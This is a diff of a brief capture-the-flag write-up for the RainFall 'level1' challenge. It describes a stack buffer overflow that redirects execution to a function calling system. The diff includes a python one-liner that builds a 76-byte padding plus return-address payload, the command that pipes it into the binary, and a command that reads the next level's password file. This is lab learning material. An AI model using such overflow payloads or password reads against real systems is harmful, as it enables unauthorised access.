@@ -3,12 +3,12 @@ The basic problem is that the function doesn't know how big the buffer is, so it
 
 there are 2 methods: main & run
 main:
-buffer size = 80
+buffer offset = 76, http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ 
 run:
 call system
 
 to execute run:
-- python -c 'print "k"*76 + "\x60\x83\x04\x08"' > /tmp/payload
+- python -c 'print "k"*76 + "\xb8\x84\x04\x08"' > /tmp/payload
 - level1@RainFall:~$ cat /tmp/payload - | ./level1
 Good... Wait what?
 cat /home/user/level2/.pass
